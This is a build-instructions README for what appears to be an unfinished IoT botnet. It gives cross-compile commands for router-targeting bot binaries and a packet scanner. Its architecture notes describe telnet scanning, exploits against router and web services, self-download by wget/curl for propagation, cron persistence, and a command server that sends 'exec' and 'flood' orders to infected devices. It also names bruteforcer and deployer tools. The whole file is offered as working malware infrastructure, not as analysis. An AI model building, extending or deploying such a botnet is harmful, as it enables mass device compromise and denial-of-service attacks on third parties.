# Build Instructions

> **DISCONTINUED**: This project is unfinished and may not be in proper working order. No support will be provided.

## Go Device Binary (all architectures)
```bash
cd core/device
export CGO_ENABLED=0

# Linux mipsle (little-endian MIPS routers) — primary target
GOOS=linux GOARCH=mipsle go build -ldflags "-s -w" -o device-mipsle .

# Linux mips (big-endian MIPS routers)
GOOS=linux GOARCH=mips go build -ldflags "-s -w" -o device-mips .

# Linux arm (IoT devices)
GOOS=linux GOARCH=arm go build -ldflags "-s -w" -o device-arm .

# Linux arm64 (aarch64)
GOOS=linux GOARCH=arm64 go build -ldflags "-s -w" -o device-arm64 .

# Linux 386 (x86)
GOOS=linux GOARCH=386 go build -ldflags "-s -w" -o device-386 .

# Linux amd64 (x86_64)
GOOS=linux GOARCH=amd64 go build -ldflags "-s -w" -o device-amd64 .

# Windows (for local testing on Windows host)
go build -o device.exe .
```

## C Device Binary (all architectures)
```bash
cd core/device

# Cross-compile from WSL2/Ubuntu (requires gcc cross-compilers)
# Install: apt-get install gcc-mipsel-linux-gnu gcc-mips-linux-gnu gcc-arm-linux-gnueabihf gcc-aarch64-linux-gnu

# MIPS little-endian (primary IoT target, ~900KB stripped)
mipsel-linux-gnu-gcc -Os -s -static -o device-mipsle device.c -lpthread

# MIPS big-endian
mips-linux-gnu-gcc -Os -s -static -o device-mips device.c -lpthread

# ARM (hardfloat)
arm-linux-gnueabihf-gcc -Os -s -static -o device-arm device.c -lpthread

# ARM64
aarch64-linux-gnu-gcc -Os -s -static -o device-arm64 device.c -lpthread

# Windows (native, via MSYS2 MinGW)
gcc -Os -s -o device-amd64.exe device.c -lws2_32
```

## Scanner Binary

```bash
# Windows (requires Npcap installed)
cd tools/scanner
go build -o fast_scanner.exe .

# Linux (requires libpcap-dev; requires sudo for raw sockets)
# cd tools/scanner
# GOOS=linux GOARCH=amd64 go build -o fast_scanner .
```

### Go Lint
```bash
cd core/device
go vet .
```

### Python Lint
```bash
python -m py_compile main.py
python -m py_compile core/iot_agent/server.py
python -m py_compile core/iot_agent/explosives.py
python -m py_compile tools/deployer/deployer.py
python -m py_compile tools/bruteforcer/bruteforce.py
```

## Architecture Notes

### C Device (primary binary — core/device/device.c)
- Small static binary (~28KB Windows, ~900KB MIPS/ARM Linux) vs Go's ~4-5MB
- JSON protocol: `{"type": "register", ...}` newline-terminated, plain text
- Heartbeat: server sends `{"type": "heartbeat"}`; device responds `{"type": "pong"}`
- Commands: `propagate` (starts scanner), `stop`, `exec`, `flood`, `ping`, `sysinfo`
- Scanner: 3 Scout threads (non-blocking async TCP connect) + 40 Worker threads
  - Scouts use `connect()` + `select()`/`getsockopt(SO_ERROR)` for fast port detection
  - Workers block on `pthread_cond_wait` until scouts find open ports
  - Shared mutex-protected linked list queue for IP:port targets
  - `gen_subnet_prioritized_ip()`: 70% hit-list subnets, 30% random
  - IP filtering via `is_bogon()` with iterative loop (no recursion)
  - Testing on ports 23/2323
  - Network tests: thinkphp, huawei, gpon80, hnap, zyxel on ports 80/8080/37215
  - Download fetches itself via `wget`/`curl` from `/agent/{arch}`
  - Persistence via cron

### Go Device (fallback — core/device/device.go)
- Larger Go binary (~4MB stripped) for arches without C cross-compiler
- Same JSON protocol and command set as C device
- Raw socket scanner (if privileges available) or TCP connect scanner fallback
- LCG-based IP generation with `hitListSubnets` density optimization

### Management Server (core/iot_agent/server.py)
- Accepts device connections, manages heartbeat
- `broadcast(command)` sends JSON commands to all connected devices
- `send_command(target_id, command)` sends to specific device
- `list_agents()` returns connected device info
- Auto-cascade: devices automatically connect on startup

### File Server (built into main.py)
- Serves device binaries at `http://<public_host>:<public_port>/agent/{arch}`
- Architectures: mips, mipsle, arm, arm64, x86, x86_64
- Primary: C device binaries
- Fallback: Go binaries

## Tutorial

Setup and usage tutorials:
https://www.youtube.com/@kydn-iu5kd